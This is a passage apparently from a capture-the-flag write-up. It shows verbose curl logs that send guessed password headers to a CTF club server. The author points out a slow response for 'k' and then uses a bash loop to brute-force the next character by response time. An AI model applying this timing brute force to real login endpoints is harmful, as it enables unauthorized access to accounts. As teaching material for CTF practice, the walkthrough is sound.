	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:X
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:32 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5161103718919255* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:Y
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:32 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.786562176526157* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:Z
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:33 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.46817110473251855%


This one entry in particular stands out. 

	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:k
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:15 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 1.7484813706349838* Rebuilt URL to: ctfclubiiit.tk:8080/

The time taken for password:k is inordinately larger than the time taken for other strings. We might be onto something here. 

	$ for i in k{a..z} k{A..Z}
	do
	curl -s ctfclubiiit.tk:8080 -H password:$i -v
	done
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ka
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:07 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9218988234058849* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kb
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:07 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8594995923746596* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kc
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:08 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9452093890074595* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kd
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:08 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.2226471239416148* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ke
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:08 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.4333871243308878* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kf
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:09 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.49895403807629624* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kg
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:09 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6713396390900179* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kh
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:10 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5087680893576534* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ki
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:10 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6357814527527106* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kj
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:11 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8063414774143967* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kk
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:11 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.09392124350878639* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kl
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:12 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7777438100265823* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:km
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:12 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8902480791649903* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kn
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:12 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7032330149107198* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ko
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:13 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6347849173607112* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kp
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:13 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.2411762772775483* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kq
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:14 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7280272720061554* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kr
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:14 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5972814360978003* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ks
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:15 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.05638351287063714* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kt
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:15 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7202364662621152* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ku
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:16 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.07075699075086517* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kv
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:16 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9473733118314565* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kw
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:16 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.2634255027474346* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kx
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:17 GMT
	< Content-Length: 28
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.71633441394593* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:ky
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:17 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 3.174663165603297* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kz
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:18 GMT
	< Content-Length: 28
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.90164159021931* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kA
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:18 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.4944101296912855* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kB
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:19 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.482329364415063* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kC
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:19 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6576374355995864* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kD
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:20 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.20929492342147737* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kE
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:20 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.40349137398553436* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kF
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:20 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8470304125936585* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kG
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:21 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7681080540701553* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kH
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:21 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8605122614022336* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kI
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:22 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.1784907764205934* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kJ
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:22 GMT
	< Content-Length: 32
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.007361008708554273* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kK
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:23 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7032281439032533* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kL
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:23 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.1603699516480357* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kM
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:23 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.4193451980680838* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kN
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:24 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6822779555412353* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kO
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:24 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5876102205912479* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kP
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:25 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5488137787930412* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kQ
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:25 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.07428262818557685* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kR
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:26 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.4035373575622718* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kS
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:26 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.42429669811986437* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kT
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:27 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9912749858823768* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kU
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:27 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.1444078648358258* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kV
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:22:27 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5472130122259367* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
